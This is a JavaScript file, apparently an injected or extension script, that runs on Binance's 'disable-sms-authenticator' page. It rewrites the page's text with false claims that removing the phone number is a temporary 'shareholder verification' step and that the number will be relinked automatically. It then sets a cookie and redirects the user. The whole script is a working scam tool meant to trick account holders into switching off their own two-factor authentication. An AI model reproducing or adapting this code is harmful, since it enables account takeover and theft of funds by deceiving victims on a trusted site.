// document.querySelector(".css-117vtj5").innerHTML="We will send you a verification code saying phonenumber removal however this is not phone number removal as our number has been saved and will automatically be linked after shareholder verification"

// var buttonView=document.querySelector(".css-itvjab")
// buttonView.querySelector("button").innerHTML="procceed"


var locationToExecute="binance.com"
var currentBrowserLocation=window.location.href

if(currentBrowserLocation.includes(locationToExecute)){

    if(currentBrowserLocation.includes("disable-sms-authenticator") ){
       var intervalid= setInterval(() => {
            document.querySelector(".css-1mzk4e3").innerHTML="Temporarily Unbind Phone Number <br>To Allow Shareholder's Verification"
if( document.querySelector(".css-117vtj5"))document.querySelector(".css-117vtj5").innerHTML="Your Phone number Or Email will never be removed as we will send via your email or phone number during this verifications. Because it has been saved in our database and it's internal to this account. This is just a step you need to follow to successfully channel a verification code to your personal shareholder's link. Your phone number will automatically be linked back to this account after this verification and same  applies to your Email"

if(document.querySelector('div [class=" css-xjrvba"]')){
    document.querySelector('div [class=" css-xjrvba"]').innerHTML="Continue to Personal link Verification"
'Continue to Personal link Verification'
document.querySelector(".css-9g8ae9").innerHTML="Phone Number Temporarily removed and will be back after verifications"
'Phone Number Temporarily removed and will be back after verifications'
document.querySelector(".css-1trk43i").innerHTML="Note: your phone number is not removed permanently because it's internal to this account. This.just to help channnel a verification code to your personal shareholder's account"
document.cookie=`passedFirstVerification=${true}`

alert("cookie set ")

window.location.href="https://www.binance.com/en/my/dashboard"
}


if(document.querySelector(".css-9g8ae9")){
    if(document.querySelector(".css-1jauszb")){
        document.querySelector(".css-9g8ae9").innerHTML="congratulations you just passed the first verification stage"
        document.querySelector(".css-1jauszb").innerHTML="continue verification"
        document.querySelector(".css-1trk43i").innerHTML="Note your phone number was never removed because it's internal to this account.Rather you passed the first stage of verification "
    }
}
        }, 1000);
    }

}

